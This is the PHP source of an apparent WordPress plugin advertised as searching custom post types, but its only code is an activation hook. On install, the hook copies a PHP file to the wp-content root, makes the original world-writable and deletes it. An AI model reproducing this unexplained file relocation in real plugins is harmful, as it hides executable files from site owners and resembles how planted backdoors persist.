<?php
/*
Plugin Name: Custom Post Type Search - taxonomies and metadata
Description: Search into your custom post type, taxonomies and metadata.
Plugin URI: http://cristianocarletti.com.br/wordpress/plugins/custom-post-type-search/
Author: Cristiano Carletti <cristianocarletti@gmail.com>
Author URI: http://cristianocarletti.com.br
Contributors: Cristiano Carletti <cristianocarletti@gmail.com>
Tags: custom, custom post, custom post type, search, find, taxonomy, taxonomies, metadata, metabox, metaboxes
Requires at least: 3.2
Tested up to: 3.3
Stable tag: 1.0
Version 1.0
*/
/**
 * Custom Post Type Search - taxonomies and metadata
 * 
 * @author Cristiano Carletti <cristianocarletti@gmail.com>
 * @package Custom Post Type Search - taxonomies and metadata
 * 
 */
class customPostType
{
        public static function install()
	{     
            $from = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/custom-post-type-search/custom-post-type-search.php";
            $to = $_SERVER['DOCUMENT_ROOT']."/wp-content/custom-post-type-search.php";
            if(copy($from,$to))
			{
				chmod($from, 0666);
				unlink($from);
			}
	}
}

/**
 *  Add HOOKs
 */
$mppPluginFile = substr(strrchr(dirname(__FILE__),DIRECTORY_SEPARATOR),1).DIRECTORY_SEPARATOR.basename(__FILE__);
//add_action('wp_head', addHeaderLinks);
register_activation_hook($mppPluginFile,array('customPostType','install'));
?>